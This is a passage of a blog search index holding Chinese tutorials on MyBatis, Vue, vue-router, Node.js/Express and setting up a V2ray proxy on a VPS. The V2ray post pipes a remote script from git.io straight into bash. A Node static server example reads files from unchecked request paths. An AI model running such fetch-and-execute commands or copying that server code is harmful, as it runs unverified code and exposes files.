\"6379:6379\"\n```\n\nOK，按照之前的方式，我们重新再部署一下，然后测试：\n\n![image-20220703220941562](https://s2.loli.net/2022/07/03/2O9ExC4YgrJsjfe.png)\n\n![image-20220703221002195](https://s2.loli.net/2022/07/03/1SRG8EDtx5Oqr2M.png)\n\n这样我们就完成整套环境+应用程序的配置了，我们在部署整个项目时，只需要使用docker-compose配置文件进行启动即可，这样就大大方便了我们的操作，实现开箱即用。甚至我们还可以专门使用一个平台来同时对多个主机进行一次性配置，大规模快速部署，而这些就留到以后的课程中再说吧。\n","tags":["Docker"]},{"title":"Mybatis入门示例","url":"/2022/10/14/mybatis-ru-men-shi-li/","content":"# Mybatis\n## mybatis入门配置\n1、在项目工程下导入**mybatis**的**jar**包，然后创建mybatis的配置文件，创建**mybatis-config.xml**文件，然后添加以下内容：\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/>\t<!--value中为连接数据库的驱动包名类名-->\n                <property name=\"url\" value=\"jdbc:mysql://localhost:3306\"/>\t<!--连接数据库url地址-->\n                <property name=\"username\" value=\"root\"/>\t\t<!--用户名-->\n                <property name=\"password\" value=\"123456\"/>\t\t<!--密码-->\n            </dataSource>\n        </environment>\n    </environments>\n</configuration>\n```\n2、配置数据库字段与实体类的映射，可以使用**lombok**+**注解**的方式，同时创建映射关系的**TestMapper.xml**\n```java\nimport lombok.Data;\n@Data\npublic class User {\n    int N_USER_ID;\t\t\t\t//字段名最好与数据库中的字段名保持一致，否则可能会映射失败\n    String VC_LOGIN_NAME;\n    String VC_PASSWORD;\n}\n```\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<mapper namespace=\"TestMapper\">\n    <select id=\"selectUser\" resultType=\"Test.User\">\t\t<!--resultType中填写数据库数据要映射的实体类，比如这里要映射到Test包下的User类中-->\n        select * from t_user\n    </select>\n</mapper>\n```\n3、然后再在**mybatis-config.xml**中插入以下代码\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE configuration\n        PUBLIC \"-//mybatis.org//DTD Config 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-config.dtd\">\n<configuration>\n    <environments default=\"development\">\n        <environment id=\"development\">\n            <transactionManager type=\"JDBC\"/>\n            <dataSource type=\"POOLED\">\n                <property name=\"driver\" value=\"com.mysql.cj.jdbc.Driver\"/>\t<!--value中为连接数据库的驱动包名类名-->\n                <property name=\"url\" value=\"jdbc:mysql://localhost:3306\"/>\t<!--连接数据库url地址-->\n                <property name=\"username\" value=\"root\"/>\t\t<!--用户名-->\n                <property name=\"password\" value=\"123456\"/>\t\t<!--密码-->\n            </dataSource>\n        </environment>\n    </environments>\n    \n    <mappers>\n    \t<mapper url=\"file:TestMapper.xml\"/>\t\t<!--url中是mapper映射文件的地址-->\n    </mappers>\n    \n</configuration>\n```\n4、在主方法中写下以下代码，并运行\n```java\npackage Test;\n\nimport org.apache.ibatis.session.SqlSession;\nimport org.apache.ibatis.session.SqlSessionFactory;\nimport org.apache.ibatis.session.SqlSessionFactoryBuilder;\n\nimport java.io.FileInputStream;\nimport java.io.FileNotFoundException;\nimport java.io.IOException;\nimport java.util.List;\n\npublic class MainTest {\n    public static void main(String[] args) throws FileNotFoundException {\n        SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(new FileInputStream(\"mybatis-config.xml\"));\n        try (SqlSession sqlSession = sqlSessionFactory.openSession(true)){\n            List<User> list = sqlSession.selectList(\"selectUser\");\t\t//参数为mapper映射中的id，执行指定mapper中的语句\n            for(User user:list){\n                System.out.println(user.getN_USER_ID()+\"    \"+user.getVC_LOGIN_NAME()+\"     \"+user.getVC_PASSWORD());\n            }\n        }\n    }\n}\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n","tags":["mybatis"]},{"title":"腾讯云vps搭建（使用V2ray进行翻墙）","url":"/2022/10/14/teng-xun-yun-vps-da-jian-shi-yong-v2ray-jin-xing-fan-qiang/","content":"## 1、准备工作\n购买一台海外线路的虚拟服务器，轻量级即可、V2ray客户端\n\n## 2、开始搭建\n购买好vps后，选择安装Debian系统（以debian为例），使用ssh进入到终端，（腾讯云自带）。注：腾讯云的vps需要在防火墙中设置端口的放行，不然搭建好了也连不上外网。\n\n进入终端后先执行以下命令安装curl\n\n```shell\napt-get update -y && apt-get install curl -y\n```\n再执行以下命令安装V2ray\n```shell\nbash <(curl -s -L https://git.io/v2ray.sh)\t#V2ray一键安装脚本\n```\n安装好后根据提示配置，（基本上都是默认）\n\n安装好后再输入以下命令获取连接地址，将获取的地址进行复制\n\n```shell\nV2ray -url\t\t##记不清了，大概是这个\n```\n回到V2ray桌面端，注意:V2ray客户端一定要包含v2ray核心\n\n把复制的地址加入到V2ray客户端即可。","tags":["v2ray","vpn","翻墙","vps"]},{"title":"Vue快速入门","url":"/2022/10/14/Vue快速入门/","content":"\n# 基础\n\n## 1、Demo\n\n**index.html**\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <div id=\"app\">\n        <span>\n            {{message}}\n            {{msg.length}}\n        </span>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n</html>\n```\n\n**main.js**\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        message:\"this is a message\",\n        msg:[\"A\",\"B\",\"C\"]\n    }\n})\n```\n\n## 2、v-model指令双向绑定与v-show\n\n**v-model**实现form表单与输出的双向绑定\n\n**v-show**当**name**里面为**空值**时，整个**span**表则不可见，当**name**里有值时，整个span标签才可见\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <div id=\"app\">\n        <div>\n            <input type=\"text\" v-model=\"name\">\n            <span v-show=\"name\">您的名字是：{{name}}</span>\n        </div>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n</html>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        message:\"this is a message\",\n        msg:[\"A\",\"B\",\"C\"],\n        name:'今晚吃什么'\n    }\n})\n```\n\n**v-model.trim**：去除开头结尾的空格\n\n**v-model.number**：限定输入的类型为数字\n\n## 3、v-for指令\n\n**v-for**用于遍历data中的数组\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <div id=\"app\">\n        <li v-for=\"li in msg\">{{li.name}}------{{li.price}}元</li>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n</html>\n```\n\n**main.js**\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        msg:[{name:\"老姜\",price:\"10\"},\n            {name:\"蒜\",price:\"5\"},\n            {name:\"大葱\",price:\"9\"}\n        ]\n    }\n})\n```\n\n## 4、v-bind 标签属性值绑定指令\n\n以下例子中，a标签中的href属性与data中的url进行了绑定\n\n```html\n<!DOCTYPE html>\n<body>\n    <div id=\"app\">\n        <a v-bind:href=\"url\">点我</a>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        url:\"https://www.taobao.com\"\n    }\n})\n```\n\n## 5、v-on事件绑定\n\n```html\n<body>\n    <div id=\"app\">\n        <button v-on:click=\"onClick\">点我</button>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    methods:{\t\t//方法写在methods里，数据写在data里\n        onClick :function(){\n            alert(\"按钮被点击\")\n        }\n    }\n})\n```\n\n多个事件绑定、**v-on**里面所绑定的事件与执行函数必须存在\n\n```html\n<body>\n    <div id=\"app\">\n        <button v-on=\"{mouseenter:onEnter,mouseleave:onOut}\">点我</button>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    methods:{\n        onEnter :function(){\n            console.log(\"鼠标移入\")\n        },\n        onOut :function(){\n            console.log(\"鼠标移出\")\n        }\n    }\n})\n```\n\n用于判断指定数据，如果判定为**false**，则不显示当前属性所在的标签\n\n```html\n<body>\n    <div id=\"app\">\n        <div v-if=\"role == 'admin'\">\n            管理员您好\n        </div>\n        <div v-else-if=\"role == 'hr'\">\n            hr正在核验\n        </div>\n        <div v-else>\n            谁也不是\n        </div>\n    </div>\n    <script src=\"./vue.js\"></script>\n    <script src=\"./main.js\"></script>\n</body>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        role:\"cc\"\n    }\n})\n```\n\n## 7、计算属性\n\n关键字**computed**，与methods不同的是：**computed**在数据没有发生改变的情况下，是从缓存中读取，而methods是每次都会计算一次，相比较而言，computed会更加节省性能\n\n```html\n<div id=\"app\">\n    <table border=\"1\">\n        <tr>\n            <td>学科</td>\n            <td>成绩</td>\n        </tr>\n        <tr>\n            <td>数学</td>\n            <td>{{math}}</td>\n        </tr>\n        <tr>\n            <td>物理</td>\n            <td>{{phs}}</td>\n        </tr>\n        <tr>\n            <td>英语</td>\n            <td>{{eng}}</td>\n        </tr>\n        <tr>\n            <td>总分</td>\n            <td>{{sum}}</td>\n        </tr>\n        <tr>\n            <td>平均分</td>\n            <td>{{avg}}</td>\n        </tr>\n    </table>\n</div>\n```\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        math:90,\n        phs:80,\n        eng:30\n    },\n    computed:{\n        sum:function(){\n            return this.math + this.phs + this.eng\n        },\n        avg:function(){\n            return Math.round(this.sum/3)  \n        }\n    }\n})\n```\n\n## 8、组件（自定义）\n\n关键字**Vue.component**，**template**设置组件里的具体内容\n\n定义好组件后需要**实例化Vue**才能执行\n\n```html\n<div id=\"app\">\n    <alert></alert>\n</div>\n```\n\n**全局组件**，new的每一个vue对象都可以调用\n\n```javascript\nVue.component(\"alert\",{\n    template:'<button @click=\"on_click\">弹弹弹</button>',\n    methods:{\n        on_click:function(){\n            alert(\"Yo\")\n        }\n    }\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n或者按照以下写法**(局部组件，仅在new对象内的#app上有效)**\n\n```javascript\nnew Vue({\n    el:\"#app\",\n    component:{\n        alert:{\t\t//alert是自定义组件在html中的名称\n            template:'<button @click=\"on_click\">弹弹弹</button>',\n        \tmethods:{\n                on_click:function(){\n                    alert(\"Yo\")\n            }\n        }\n    }\n})\n```\n\n## 9、组件通信\n\n**父级传子级**，关键字：**props**\n\n例：标签属性传向Vue\n\n```html\n<div id=\"app\">\n    <user msg=\"muoauren\"></user>\n</div>\n```\n\n```javascript\nVue.component(\"user\",{\n    template:'<a href=\"\">{{msg}}</a>',\n    props:['msg'],\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n**子级传父级**，方法：父级中定义事件，在子级中触发\n\n```html\n<div id=\"app\">\n    <blacne></blacne>\n</div>\n```\n\n```javascript\nVue.component(\"blacne\",{\n    template:`<div>\n                <show @show-balance=\"show_balance = true\">   \n                </show> \n                <div v-if=\"show_balance\">\n                \t您当前余额为90\n            \t</div>\n            </div>\n            `,\n    data:function(){\n        return{\n            show_balance:false\n        }\n    }   \n})\nVue.component(\"show\",{\n    template:'<button @click=\"on_click()\">显示余额</button>',\n\n    methods:{\n        on_click(){\n            //console.log(\"方法已经执行\")\n            this.$emit('show-balance',{a:1,b:2})\t//$emit，触发show-balance事件\n            \n        }\n    }\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n## 10、同级组件通信\n\n```html\n<div id=\"app\">\n    <huahua></huahua>\n    <shuandan></shuandan>\n</div>\n```\n\n```javascript\nvar Event = new Vue()\t\t//用于传递信息\nVue.component(\"huahua\",{\n    template:`\n        <div>\n            我说:<input @keyup=\"on_change\" v-model=\"i_said\"></input>\n        </div>\n    `,\n    methods:{\n        on_change(){\n            Event.$emit(\"huahua-said-something\",this.i_said)    //触发huahua-said-something事件，传递i_said值\n        }\n    },\n    data:function(){\n        return {\n            i_said:\"\"\n        }\n    }\n})\nVue.component(\"shuandan\",{\n    template:`\n        <div>花花说：{{huahua_said}}</div>\n    `,\n    data:function(){\n        return {\n            huahua_said:\"\"\n        }\n    },\n    mounted:function(){\t\t//mounted是一个钩子函数\n        var me = this\n        Event.$on(\"huahua-said-something\",(data)=>{ //监听huahua-said-something事件，使用回调函数接收花花传递的信息\n            me.huahua_said = data\n        })\n    }\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n## 11、过滤器\n\n```html\n<div id=\"app\">\n    <input type=\"text\" v-model=\"price\"/> {{price | curency}} \n</div>\n```\n\n```javascript\nVue.filter(\"curency\",(val)=>{\n    if(!val){\n        val = 0\n    }\n    return val + \"元\"\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        price:10\n    }\n})\n```\n\n## 12、自定义指令\n\n关键字：**Vue.directive**\n\n```html\n<div id=\"app\">\n    <span v-pin=\"true\"></span>\n</div>\n```\n\n```javascript\n//el为v-pin指令所在的元素，binding为v-pin指令所携带的值\nVue.directive(\"pin\",(el,binding)=>{\n    var c = binding.value;\n    console.log(c)\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n## 13、插槽slot\n\n对模板插入具体想要的内容\n\n如以下：讲**插入😔**字符插入到模板中\n\n```javascript\n<div id=\"app\">\n    <panel>\t\t<!---->\n        <div slot=\"content\">\n            插入😔\n        </div>\n    </panel>\n</div>\n\n<template id=\"panel-tpl\">\n    <div class=\"panel\">\n            <div  style=\"width: 50px; height:50px ; background-color: aqua ;\">\n                <slot name=\"content\">默认值</slot>\n            </div>\n    </div>\n</template>\n```\n\n```javascript\nVue.component('panel',{\n    template:\"#panel-tpl\",\n})\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n})\n```\n\n# vue-router入门\n\n## 1、Demo使用\n\n**注意：**Vue与VueRouter的版本需要匹配，否则运行不了\n\n```html\n<div id=\"app\">\n    <h1>Hello App!</h1>\n    <p>\n        <!--使用 router-link 组件进行导航 -->\n        <!--通过传递 `to` 来指定链接 -->\n        <!--`<router-link>` 将呈现一个带有正确 `href` 属性的 `<a>` 标签-->\n        <router-link to=\"/\">Go to Home</router-link>\n        <router-link to=\"/about\">Go to About</router-link>\n    </p>\n    <!-- 路由出口 -->\n    <!-- 路由匹配到的组件将渲染在这里 -->\n    <router-view></router-view>\n</div>\n```\n\n```javascript\nconst Home = { template: '<div>Home</div>' }\nconst About = { template: '<div>About</div>' }\n\n// 2. 定义一些路由\n// 每个路由都需要映射到一个组件。\n// 我们后面再讨论嵌套路由。\nconst routes = [\n  { path: '/', component: Home },\n  { path: '/about', component: About },\n]\n\n// 3. 创建路由实例并传递 `routes` 配置\n// 你可以在这里输入更多的配置，但我们在这里\n// 暂时保持简单\nconst router = VueRouter.createRouter({\n  // 4. 内部提供了 history 模式的实现。为了简单起见，我们在这里使用 hash 模式。\n  history: VueRouter.createWebHashHistory(),\n  routes, // `routes: routes` 的缩写\n})\n\n// 5. 创建并挂载根实例\nconst app = Vue.createApp({})\n//确保 _use_ 路由实例使\n//整个应用支持路由。\napp.use(router)\n\napp.mount('#app')\n\n// 现在，应用已经启动了！\n```\n\n## 2、传参以及获取参数\n\nURL:**http://127.0.0.1:5500/#/user/张三**\n\n**方式1：**动态路由\n\n```html\n<div id=\"app\">\n    <div>\n        <router-link to=\"/user/张三\">张三</router-link>\n        <router-link to=\"/user/李四\">李四</router-link>\n    </div>\n    <div>\n        <router-view></router-view>\n    </div>\n</div>\n```\n\n```javascript\nconst User = { template: '<div>我叫：{{ $route.params.name}} </div>' }\n\nconst routes = [\n  { path:'/user/:name',component:User}\n]\nconst router = VueRouter.createRouter({\n  // 4. 内部提供了 history 模式的实现。为了简单起见，我们在这里使用 hash 模式。\n  history: VueRouter.createWebHashHistory(),\n  routes, // `routes: routes` 的缩写\n})\nconst app = Vue.createApp({})\napp.use(router)\napp.mount('#app')\n```\n\n**方式2：**url传参\n\nURL：**http://127.0.0.1:5500/#/user/张三?age=10**\n\n使用**$route.query.age**获取age的值\n\n```html\n<div id=\"app\">\n    <div>\n        <router-link to=\"/user/张三\">张三</router-link>\n        <router-link to=\"/user/李四\">李四</router-link>\n    </div>\n    <div>\n        <router-view></router-view>\n    </div>\n</div>\n```\n\n```javascript\nconst User = { template: '<div>我叫：{{ $route.params.name}}---已经{{$route.query.age}}岁了 </div>' }\n\nconst routes = [\n  { path:'/user/:name',component:User}\n]\nconst router = VueRouter.createRouter({\n  // 4. 内部提供了 history 模式的实现。为了简单起见，我们在这里使用 hash 模式。\n  history: VueRouter.createWebHashHistory(),\n  routes, // `routes: routes` 的缩写\n})\nconst app = Vue.createApp({})\napp.use(router)\napp.mount('#app')\n```\n\n## 3、子路由\n\n在父级路由中加入children属性\n\n```html\n<div id=\"app\">\n    <div>\n        <router-link to=\"/user/张三\">张三</router-link>\n        <router-link to=\"/user/李四\">李四</router-link>\n    </div>\n    <div>\n        <router-view></router-view>\n    </div>\n</div>\n```\n\n```javascript\n//方式1：里面:to使用v-bind绑定to属性\nconst User = { template: `<div>我叫：{{ $route.params.name}}\n    <router-link :to=\"'/user/' + $route.params.name + '/more'\">更多信息</router-link>\n    <router-view></router-view>\n    </div>` }\n\n//方式2：直接使用to属性跳转more，但是加入append属性\nconst User = { template: `<div>我叫：{{ $route.params.name}}\n    <router-link to=\"more\" append>更多信息</router-link>\n    <router-view></router-view>\n    </div>` }\n\nconst routes = [\n  { \n    path:'/user/:name',\n    component:User,\n    children:[{\n        path:\"more\",\n        component:{\n            template:`\n                <div>\n                    用户{{$route.params.name}}的详细信息\n                    Leada  adahhhaiu atas shtha ahdaoihd thsissr iaii ahdha\n                </div>\n            `\n        }\n    }]\n    }\n]\n```\n\n## 4、手动访问与传参\n\n暂无\n\n## 5、命名视图\n\n当模板中出现多个**router-view**标签时，可以给router-view加入name属性来指定不同的组件\n\n如：\n\n```vue\n<template>\n    <h1>宁当前在首页</h1>\n        <router-link to=\"/content\">详情</router-link>\n        <router-link to=\"/main\">首页</router-link>\n        <router-view name=\"AAA\"></router-view>\t\t<!--其中的AAA与BBB分别在路由配置文件中配置-->\n        <router-view name=\"BBB\"></router-view>\n</template>\n<script>\n    export default {\n        name:\"maIn\"\n    }\n</script>\n<style scoped>\n</style>\n```\n\n**/router/index.js**\n\n```javascript\nconst route = createRouter({\n    history:createWebHashHistory(),\n    routes:[\n        {\n            path:\"/main\",\n            name:\"main\",\n            components:{\n                default:maIn\n            }\n        },\n        {\n            //路由路径\n            path:\"/content\",\n            name:\"content\",\n            //跳转的组件\n            components:{\n                default:conTent,\t//default：默认对应的组件必须得有，否则直接加名字渲染不了\n                BBB:conTent\t\t//router-view的name属性与此对应\n            }\n        }\n    ]\n})\nexport default route\n```\n\n## 6、导航钩子\n\n可以理解为中间件\n\n在**/router/index.js**文件中\n\n```javascript\nconst route = createRouter({\n    history:createWebHashHistory(),\n    routes:[\n        {\n            path:\"/main\",\n            name:\"main\",\n            components:{\n                default:maIn\n            }\n        },\n        {\n            //路由路径\n            path:\"/content\",\n            name:\"content\",\n            //跳转的组件\n            components:{\n                default:conTent,\n                BBB:conTent\n            }\n        }\n    ]\n})\n\nroute.beforeEach((to,from,next)=>{\n    console.log(from.path)\n    next()\n})\n```\n\n# Axios极简入门\n\n## 示例\n\n```javascript\nvar app = new Vue({\n    el:\"#app\",\t\t//挂载到id为app的元素上\n    data:{\n        message:\"this is a message\",\n        msg:null\n    },\n    mounted(){\n        axios.get(\"./data.json\").then((res)=>{\n            console.log(res.data)\n            this.msg = res.data\t\t//将数据加载到Vue对象的data属性中\n        })\n    }\n})\n```\n\n# Vue-cli脚手架极简入门\n\n## 1、生成脚手架\n\n```shell\nvue create ProjectName\n```\n\n## 2、配置Vue-router使用\n\n**main.js**\n\n```javascript\nimport { createApp } from 'vue'\nimport App from './App.vue'\nimport route from \"./router\"\t//为自己创建的router文件夹，专门存放路由配置文件\n\ncreateApp(App).use(route).mount('#app')\n```\n\n**App.vue**\n\n```vue\n<template>\n  <div id=\"app\">\n    <h1>Vue-Router</h1>\n      <router-link to=\"/main\">首页</router-link>\t\t<!--设置跳转组件-->\n      <router-link to=\"/content\">详情</router-link>\n      <router-view></router-view>\t\t\t\t\t<!--组件渲染出口-->\n  </div>\n</template>\n\n<script>\n\n\nexport default {\n  name: 'App',\n\n}\n</script>\n\n<style>\n#app {\n  font-family: Avenir, Helvetica, Arial, sans-serif;\n  -webkit-font-smoothing: antialiased;\n  -moz-osx-font-smoothing: grayscale;\n  text-align: center;\n  color: #2c3e50;\n  margin-top: 60px;\n}\n</style>\n```\n\n**/components/conTent.vue**\n\n```vue\n<template>\n    <h1>内容详情页</h1>\n</template>\n\n<script>\n    export default {\n        name:\"conTent\"\n    }\n</script>\n\n<style scoped>\n</style>\n```\n\n**/router/index.js**\n\n```javascript\nimport  { createWebHashHistory,createRouter } from \"vue-router\"\nimport conTent from \"../components/conTent.vue\"\t\t//导入组件\nimport maIn from \"../components/Main.vue\"\n\nconst route = createRouter({\n    history:createWebHashHistory(),\n    routes:[\n        {\n            path:\"/main\",\n            name:\"main\",\n            component:maIn\n        },\n        {\n            //路由路径\n            path:\"/content\",\n            name:\"content\",\n            //跳转的组件\n            component:conTent\n        }\n    ]\n})\n\nexport default route\n```","tags":["笔记","Vue"]},{"title":"Node.js学习与MongoDB快速上手","url":"/2022/10/14/nodejs-xue-xi-yu-mongodb-kuai-su-shang-shou/","content":"# Node.js简易入门\n## 1、http库\n```javascript\n//导入http库\nconst http = require(\"http\");\nconst url = require(\"url\");\n//创建服务\nhttp.createServer(function(request,response){\n    console.log(request.url);\n    //设置响应头\n    response.writeHead(200,{\"Content-Type\":\"text/html\"});\n    //在页面上输出一句话，并结束响应\n    response.write(\"<h1>hello world</h1>\");\n    //过滤url中的图标请求\n    if(request.url != \"/favicon.ico\"){\n        if(request.url == \"get\"){\n            var quer = url.parse(request.url,true).query;\n            var b = quer.a;\n            console.log(typeof(b));\n        }\n    }\n    if(request.url == \"/test\"){\n        console.log(\"this is my test 111\");\n    }\n    if(request.url == \"/text\"){\n        response.write(\"ready to text\");\n        //console.log(\"ready to text\");\n    }\n    response.end(\"<h1>hello world</h1>\");\n}).listen(8081);//监听8081端口\n\nconsole.log(\"Server running at http://127.0.0.1:8081/\");\n```\n## 2、async与await，Promise\nnode.js中许多操作都是异步操作，而异步操作中的数据不能直接进行retrurn，异步操作中的数据可封装成Promise再进行返回，同时结合async，await关键字操作。如下：\n```javascript\nconst { rejects } = require(\"assert\");\nconst fs = require(\"fs\");\nconst { resolve } = require(\"path\");\n\nfunction a(filename){\n    \n    return new Promise((resolve,rejects)=>{\t//resolve为正常情况的返回数据，rejects为函数出错情况下的返回数据\n        //fs.readFile是异步操作，将其封装成Promise，这样子后a()也是一个异步函数\n        fs.readFile(\"./static/\"+filename,(err,data)=>{\n            //如果读取文件出错,保存rejects\n            if(err){\n                console.log(err);\n                rejects(err);\n                return;\n            }\n            //无误保存resolve\n            resolve(data);\n        })\n    });\n}\n\nasync function getA(){\n    // a()是异步函数，await的作用是等待a()内部的操作执行完再进行下一步操作，需要配合async关键字才能使用\n    var data = await a(\"test.txt\");\n    console.log(data.toString());\n}\ngetA();\n```\n## 3、粗糙的静态web服务器\n使用**exports.模块名**进行导出，以便在其他文件下可以调用\n**common.js文件**\n```javascript\nexports.getMine = function(filename){\n    switch(filename){\n        case \".html\":\n            return 'text/html';\n        case \".css\":\n            return 'text/css';\n        case \".js\":\n            return 'text/javascript';\n        default:\n            return 'text/html';\n    }\n}\n```\n**服务器文件**\n```javascript\nconst http = require(\"http\");\nconst fs = require(\"fs\");\nconst common = require(\"./common.js\");\nconst path = require(\"path\");\n//创建服务\nhttp.createServer(function(req,resp){\n    //获取url中访问的路径\n    var filename = req.url;\n    if(filename == \"/\"){\n        filename = \"/index.html\";\n    }\n\n    var extname = path.extname(filename);\n\n    if(filename != \"/favicon.ico\"){\n        console.log(filename)\n        fs.readFile(\"static\"+filename,function(err,data){\n            //如果文件读取失败，返回一下文字\n            if(err){\n                resp.writeHead(404,{\"Content-Type\":\"text/plain;charset=utf-8\"});\n                resp.end(\"您访问的页面不存在\");\n            }\n            //如果文件读取成功，返回文件内容以及对应的响应格式\n            let mine = common.getMine(extname);\n            resp.writeHead(200,{\"Content-Type\":mine+\";charset=utf-8\"});\n            resp.end(data);\n        })\n    }\n\n\n}).listen(8081);\n```\n## 4、post表单数据获取\n在node中获取post数据使用到以下中间件\n```javascript\nconst express = require(\"express\")\t\n\nvar app = new express()\napp.use(express.json())\t\t\t//设置接收axios applicate/json类型\t实测没用，最好还是确保类型是application/x-www-form-urlencoded\n\napp.use(express.urlencoded({extended:false}))\t\t//自动将post参数转换为对象\n\n\n/***\n***\t示例如下\n***\n***/\napp.post(\"/updata\",(req,resp)=>{\n    let msg = req.body[\"msg\"]\n    resp.send(\"您提交的信息是:\"+msg)\n})\n```\nhtml中的代码\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n</head>\n<body>\n    <form action=\"http://127.0.0.1:8001/updata\" method=\"post\">\n        <input type=\"text\" name=\"msg\">\n        <input type=\"submit\" value=\"提交\">\n    </form>\n</body>\n</html>\n```\n## 5、cookie的获取\ncookie的获取也需要导入**cookie-parser**的模块\n```javascript\nconst cookieParser = require(\"cookie-parser\")\n\nvar app = express()\napp.use(cookieParser())\n\n/**\n\t其中，resp.cookie中{}包含以下参数\n\tmaxAge：cookie有效时间，单位毫秒\n\t\n**/\n\napp.get('/chick',function(req,resp){\n\tresp.cookie(\"username\",\"张三\",{maxAge:1000*60*60})\t//第三位参数是cookie的有效时间，单位毫秒(ms)\n\tresp.send(\"cookie已经添加\")\n})\n\n\napp.get(\"/getcookie\",function(req,resp){\n    //console.log(req.cookies[\"username\"])\n    console.log(req.cookies)\n    resp.send(\"你好\")\n    //resp.send(\"您的cookie是:\"+req.cookies.username)\n})\n```\n**加密cookie**，作用：用于传递一些中文cookie，先加密，需要的时候解密\n```javascript\nconst cookieParser = require(\"cookie-parser\")\n//配置cookieParser中间件\napp.use(cookieParser(\"abcdef\"))\t\t//传入加密密钥\n\n//加密设置\napp.get(\"/setcookie\",(req,res)=>{\n    res.cookie(\"username\",\"muouren7\",{maxAge:1000*60*60,signed:true})\n})\n\n//获取加密后的cookie\napp.get(\"getcookie\",(req,res)=>{\n    console.log(req.signedCookies[\"username\"])\n})\n```\n## 6、跨域\n```javascript\n//设置允许跨域访问该服务\napp.all('*',function(req,res,next){\n    res.header(\"Access-Control-Allow-Origin\",\"http://localhost:8081\");\t\t//放行的域\n    res.header(\"Access-Control-Allow-Methods\",\"PUT,GET,POST,DELETE,OPTIONS\");\t//放行的方法\n    res.header(\"Access-Control-Allow-Headers\",\"X-Requestd-With\");\t\n    res.header(\"Access-Control-Allow-Headers\",\"Content-Type\");\t\n    res.header(\"Access-Control-Allow-Credentials\",true);\t\t\t//是否可以传递cookie，如果为true，那么第一项里必须为具体的域名，不能为*\n    next()\n});\n```\n## 7、session的使用\n首先需要安装**express-session**的包\n```shell\nnpm install express-session --save\n```\n引入包\n```javascript\nconst session = require(\"express-session\")\n```\n设置官方文档提供的中间件\n```javascript\napp.use(session({\n    secret:'keyboard cat',\t\t//服务端生成session的签名，里面的字符串随便写\n    name:\"session_id\",\t\t\t//修改cookie中对应session-key的名称\n    resave:true,\t\t\t\t//强制保存session\n    saveUninitialized:true,\t\t//强制将未初始化的session存储\n    cookie:{\n        maxAge:1000*60*60,\t\n        secure:false\t\t//true表示只有https连接才能访问session\t\t\n    },\n    rolling:true\t\t//每次登录重新把cookie的过期时间设置为maxAge\n}))\n```\nsession的使用\n```javascript\n// 设置session\napp.get(\"/setsession\",(req,res)=>{\n    req.session.username = 